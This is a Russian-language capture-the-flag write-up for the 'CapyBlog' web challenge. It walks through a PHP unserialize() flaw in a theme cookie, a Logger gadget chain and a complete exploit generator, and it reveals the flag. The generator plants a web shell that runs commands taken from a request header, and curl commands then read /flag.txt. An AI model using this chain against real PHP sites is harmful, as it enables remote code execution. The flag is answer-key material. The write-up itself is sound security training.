# [web] CapyBlog

> **Категория:** `web`  
> **CTF:** KubSTU CTF 2026 Spring

### Описание:

*В последнее время смена темы барахлит. Может, это всё из-за жуков? Раньше сайт так же работал?*

### Решение:

**Ищем бекап**


 ![img_1.png](./images/img_1.png)

обнаруживаем бекап веб приложения по пути `[/backup/www.zip](http://172.20.0.2/backup/www.zip)`


#### **Обнаружение вектора атаки**

Всё начинается с поиска функций, которые принимают данные от пользователя. В PHP главный «красный флаг» — это `unserialize()`, если в неё попадает что-то из `$_GET`, `$_POST` или `$_COOKIE`.

**Уязвимый участок (**`utils.php`):


 ![img_2.png](./images/img_2.png)

- Приложение доверяет содержимому куки `theme`.  Ожидает там объект или массив с настройками темы.
- **Проблема:** `unserialize()` не просто восстанавливает данные, она создаёт экземпляры тех классов объекты, которые объявлены в системе. Если мы передадим строку, описывающую объект класса `Logger`, PHP его создаст.

Когда PHP восстанавливает объект из строки, он автоматически вызывает специальные «магические методы». Это и есть наш рычаг управления.

**Магические методы в** `classes.php`:

1. `__wakeup()` - вызывается СРАЗУ при десериализации.
2. `__destruct()` - вызывается, когда объект удаляется из памяти (конец выполнения скрипта).
3. `__toString()` - вызывается, если объект пытаются использовать как строку.

> В нашем случае `__wakeup` в классе `FileHandler` просто открывает и закрывает файл - это скучно. А вот `Logger` - имеет интересный для нас функционал


#### **Поиск полезного «Гаджета» (POP Chain)**

Мы ищем метод, который делает что-то опасное с данными, которые мы можем контролировать.

**Анализ класса** `Logger` (`classes.php`):


 ![img_3.png](./images/img_3.png)

- Мы полностью контролируем свойства `$logFile` и `$message` через сериализованную строку.
- Мы можем заставить PHP записать **любую строку** в **любой файл**, к которому у веб-сервера есть доступ на запись.

  #### **Пишем Шелл**

Теперь соединяем всё воедино. Нам нужно:

1. Выбрать имя файла (например, в корне веб приложения `/var/www/html/`
2. Сформировать PHP-код (шелл).
3. Запаковать это в формат, понятный `unserialize()`.

**Логика эксплоита:**

- Создаем объект `Logger`.
- Присваиваем `$logFile = "/var/www/html/css_optimizer.php"`.
- Присваиваем `$message = "<?php system(\$_GET['cmd']); ?>"`.
- Сериализуем (`O:6:"Logger":2:{s:7:"logFile";s:31:"..."; ...}`).
- Кодируем в Base64 и подставляем в куку.

> Когда скрипт `index.php` (или любой другой, где подключен `utils.php`) закончит работу, сработает деструктор нашего «фейкового» логгера и создаст файл с шеллом.

---

Официальный эксплоит (для генерации полезной нагрузки можно также использовать [онлайн компиляторы]() PHP )

```php
<?php

/**
 * PoC Exploit for CapyBlog Deserialization
 * Generates a Base64 cookie payload for RCE
 */

class Logger
{
    public $logFile;
    public $message;

    public function __construct($file, $msg)
    {
        $this->logFile = $file;
        $this->message = $msg;
    }
}

// 1. Настройка параметров
// Файл будет создан в корневой директории веб-приложения
$shell_filename = "general_shell.php";
$shell_path = "./" . $shell_filename;

// Шелл: использует заголовок 'X-Capy-Command' для выполнения кода
$shell_content = '<?php if($c=$_SERVER["HTTP_X_CAPY_COMMAND"]){echo "---OUT---\n";system($c);echo "---END---\n";} ?>';

// 2. Создание объекта и генерация куки
$exploit_obj = new Logger($shell_path, $shell_content);
$serialized_payload = serialize($exploit_obj);
$cookie_payload = base64_encode($serialized_payload);

// 3. Вывод команд для атакующего
echo "--- CAPYBLOG RCE EXPLOIT GENERATOR ---\n\n";

echo "[STEP 1] Отправка payload для создания шелла:\n";
echo "curl -v -b \"theme={$cookie_payload}\" http://TARGET/index.php\n\n";

echo "[STEP 2] Проверка RCE (выполнение 'id'):\n";
echo "curl -H \"X-Capy-Command: id\" http://TARGET/{$shell_filename}\n";



echo "[STEP 2] Проверка RCE (выполнение 'id'):\n";
echo "curl -H \"X-Capy-Command: cat \/flag.txt\" http://TARGET/{$shell_filename}\n";


?>
```

Прочитать файл /flag

## Флаг 

```graphql
KubSTU(capybl0g_php_d3s3r1al1zat10n)
```


